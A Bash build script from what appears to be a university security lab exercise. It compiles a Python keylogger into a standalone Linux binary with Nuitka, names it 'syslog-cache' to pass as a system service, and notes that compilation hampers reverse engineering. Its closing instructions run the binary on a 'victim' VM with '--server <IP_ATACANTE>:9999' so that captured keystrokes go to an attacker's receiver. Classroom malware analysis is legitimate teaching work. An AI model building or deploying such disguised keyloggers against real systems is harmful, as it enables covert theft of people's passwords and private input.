#!/usr/bin/env bash
# =============================================================================
# Proyecto Unidad 2 - Seguridad Informática
# Ejercicio 3: Script de compilación con Nuitka
# =============================================================================
#
# Descripción:
#   Convierte keylogger.py a un binario ELF ejecutable de Linux usando
#   Nuitka, que compila Python a código C real para mayor rendimiento
#   y dificultad de reversing.
#
# Uso:
#   chmod +x build.sh
#   ./build.sh
#
# Requisitos:
#   pip install nuitka pynput cryptography requests
#   (además: patchelf instalado en el sistema)
#
# Salida:
#   syslog-cache   ← ejecutable standalone
# =============================================================================

set -e   # Detener si algún comando falla

echo "============================================================"
echo " Build Script - Keylogger Linux (Nuitka)"
echo "============================================================"

# ---- Verificar dependencias del sistema ----
echo "[1/5] Verificando dependencias del sistema..."
if ! command -v patchelf &> /dev/null; then
    echo "[ERROR] 'patchelf' no está instalado."
    echo "        Instálalo con: sudo apt install patchelf"
    echo "        O en Arch:     sudo pacman -S patchelf"
    exit 1
fi

# ---- Crear entorno virtual e instalar dependencias ----
echo "[2/5] Creando entorno virtual e instalando dependencias..."
python3 -m venv .venv
.venv/bin/pip install --quiet nuitka pynput cryptography requests

# ---- Limpiar builds anteriores ----
echo "[3/5] Limpiando builds anteriores..."
rm -f syslog-cache
rm -rf keylogger.build keylogger.dist keylogger.onefile-build

# ---- Compilar con Nuitka ----
# Opciones importantes:
#   --onefile              → un único binario standalone
#   --output-filename      → nombre del ejecutable (disfrazado como servicio)
#   --remove-output        → elimina carpetas temporales al terminar
#   --assume-yes-for-downloads → descarga deps de Nuitka sin preguntar
echo "[4/5] Compilando keylogger.py con Nuitka (esto tarda unos minutos)..."
.venv/bin/python -m nuitka \
    --onefile \
    --output-filename=syslog-cache \
    --remove-output \
    --assume-yes-for-downloads \
    keylogger.py

# ---- Limpiar entorno virtual ----
rm -rf .venv

echo "[5/5] Compilación exitosa."

# ---- Verificar binario generado ----
BINARY="syslog-cache"
if [ -f "$BINARY" ]; then
    SIZE=$(du -sh "$BINARY" | cut -f1)
    echo ""
    echo "      Binario: $BINARY"
    echo "      Tamaño:  $SIZE"
    echo "      Tipo:    $(file $BINARY | cut -d: -f2)"
else
    echo "[ERROR] No se encontró el binario '$BINARY'"
    exit 1
fi

# ---- Calcular hashes (IoC) ----
echo ""
echo "[IoCs] Hashes del binario para informe técnico:"
echo ""
echo "  MD5:    $(md5sum $BINARY | awk '{print $1}')"
echo "  SHA1:   $(sha1sum $BINARY | awk '{print $1}')"
echo "  SHA256: $(sha256sum $BINARY | awk '{print $1}')"

echo ""
echo "============================================================"
echo " Build completado. Próximos pasos:"
echo ""
echo "  1. Subir syslog-cache a VirusTotal para análisis:"
echo "     https://www.virustotal.com/gui/file"
echo ""
echo "  2. Ejecutar en VM de víctima:"
echo "     chmod +x syslog-cache"
echo "     ./syslog-cache --server <IP_ATACANTE>:9999"
echo ""
echo "  3. En VM del atacante, iniciar el servidor receptor:"
echo "     python3 server.py --port 9999"
echo "============================================================"
